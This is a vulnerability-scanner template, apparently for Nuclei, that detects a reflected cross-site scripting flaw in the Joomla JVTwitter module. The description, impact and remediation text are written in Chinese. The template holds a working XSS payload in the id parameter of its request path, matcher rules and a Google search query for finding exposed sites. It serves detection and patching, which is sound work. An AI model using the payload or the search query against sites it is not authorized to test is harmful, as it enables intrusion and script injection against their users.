id: joomla-jvtwitter-xss

info:
  name: Joomla JVTwitter - 跨站脚本漏洞
  author: r3Y3r53
  severity: medium
  description: |
    该模板用于检测 Joomla JVTwitter - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/modules/mod_jvtwitter/jvtwitter.php?id=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain...`、`/modules/mod_jvtwitter/jvtwitter.php?id=` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://buaq.net/go-44433.html
    - https://cxsecurity.com/issue/WLB-2020110041
    - https://extensions.joomla.org/
  classification:
    cwe-id: CWE-79,CWE-83
  metadata:
    verified: true
    max-request: 2
    google-query: inurl:mod_jvtwitter/jvtwitter.php?id=
  tags: joomla,jvtwitter,xss,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/modules/mod_jvtwitter/jvtwitter.php?id=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E"
      - "{{BaseURL}}/modules/mod_jvtwitter/jvtwitter.php?id="

    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200'
          - 'contains(content_type_1, "text/html")'
          - 'contains(body_1, "><img src=x onerror=prompt(document.domain)")'
          - 'contains(body_2,"{\"rs\":\"0")'
        condition: and
